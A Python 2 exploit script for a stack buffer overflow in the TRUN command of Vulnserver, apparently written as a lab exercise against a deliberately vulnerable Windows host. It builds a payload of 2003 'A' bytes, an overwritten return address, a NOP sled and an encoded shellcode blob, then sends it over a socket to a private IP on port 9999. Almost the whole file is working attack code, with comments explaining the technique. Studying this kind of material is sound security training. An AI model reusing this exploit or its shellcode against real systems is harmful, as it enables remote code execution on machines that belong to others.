#!/usr/bin/python
import sys, socket

overflow = ("\xda\xd3\xd9\x74\x24\xf4\xba\x17\x27\x69\x79\x5e\x29\xc9\xb1"
"\x52\x31\x56\x17\x83\xee\xfc\x03\x41\x34\x8b\x8c\x91\xd2\xc9"
"\x6f\x69\x23\xae\xe6\x8c\x12\xee\x9d\xc5\x05\xde\xd6\x8b\xa9"
"\x95\xbb\x3f\x39\xdb\x13\x30\x8a\x56\x42\x7f\x0b\xca\xb6\x1e"
"\x8f\x11\xeb\xc0\xae\xd9\xfe\x01\xf6\x04\xf2\x53\xaf\x43\xa1"
"\x43\xc4\x1e\x7a\xe8\x96\x8f\xfa\x0d\x6e\xb1\x2b\x80\xe4\xe8"
"\xeb\x23\x28\x81\xa5\x3b\x2d\xac\x7c\xb0\x85\x5a\x7f\x10\xd4"
"\xa3\x2c\x5d\xd8\x51\x2c\x9a\xdf\x89\x5b\xd2\x23\x37\x5c\x21"
"\x59\xe3\xe9\xb1\xf9\x60\x49\x1d\xfb\xa5\x0c\xd6\xf7\x02\x5a"
"\xb0\x1b\x94\x8f\xcb\x20\x1d\x2e\x1b\xa1\x65\x15\xbf\xe9\x3e"
"\x34\xe6\x57\x90\x49\xf8\x37\x4d\xec\x73\xd5\x9a\x9d\xde\xb2"
"\x6f\xac\xe0\x42\xf8\xa7\x93\x70\xa7\x13\x3b\x39\x20\xba\xbc"
"\x3e\x1b\x7a\x52\xc1\xa4\x7b\x7b\x06\xf0\x2b\x13\xaf\x79\xa0"
"\xe3\x50\xac\x67\xb3\xfe\x1f\xc8\x63\xbf\xcf\xa0\x69\x30\x2f"
"\xd0\x92\x9a\x58\x7b\x69\x4d\xa7\xd4\x70\x87\x4f\x27\x72\x86"
"\xd3\xae\x94\xc2\xfb\xe6\x0f\x7b\x65\xa3\xdb\x1a\x6a\x79\xa6"
"\x1d\xe0\x8e\x57\xd3\x01\xfa\x4b\x84\xe1\xb1\x31\x03\xfd\x6f"
"\x5d\xcf\x6c\xf4\x9d\x86\x8c\xa3\xca\xcf\x63\xba\x9e\xfd\xda"
"\x14\xbc\xff\xbb\x5f\x04\x24\x78\x61\x85\xa9\xc4\x45\x95\x77"
"\xc4\xc1\xc1\x27\x93\x9f\xbf\x81\x4d\x6e\x69\x58\x21\x38\xfd"
"\x1d\x09\xfb\x7b\x22\x44\x8d\x63\x93\x31\xc8\x9c\x1c\xd6\xdc"
"\xe5\x40\x46\x22\x3c\xc1\x66\xc1\x94\x3c\x0f\x5c\x7d\xfd\x52"
"\x5f\xa8\xc2\x6a\xdc\x58\xbb\x88\xfc\x29\xbe\xd5\xba\xc2\xb2"
"\x46\x2f\xe4\x61\x66\x7a")

# Return address is 0x625011af

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow #overwrite everything with A's(41), except for the EIP, we overwrite it with the return address we got. Since we deal with x86 architecture here, we have to use little endian format. The pointer will point to the overflow (malicious shellcode) we provided after that. We had a little bit of pad space using "\x90" (no operation) in between the jump command and the shellcode to make sure the shellcode gets executed.

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.1.20', 9999)) #IP of the windows machine running Vulnserver and port number
        s.send(('TRUN /.:/' + shellcode))
        s.close()
                        
except:
        print "Error connecting to the server!!"
        sys.exit()    